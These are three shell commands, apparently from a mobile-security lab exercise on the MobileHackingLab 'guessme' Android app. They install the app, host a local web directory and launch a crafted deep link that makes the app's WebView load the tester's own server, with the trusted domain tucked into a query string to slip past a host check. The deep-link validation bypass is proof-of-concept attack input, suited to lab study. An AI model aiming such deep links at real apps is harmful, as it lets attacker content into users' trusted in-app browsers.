adb install com.mobilehackinglab.guessme.apk
python3 -m http.server 8080 -d http &
adb shell 'am start -a android.intent.action.VIEW -d mhl://mobilehackinglab?url=http://10.0.2.2:8080/?x=mobilehackinglab.com com.mobilehackinglab.guessme/.WebviewActivity'

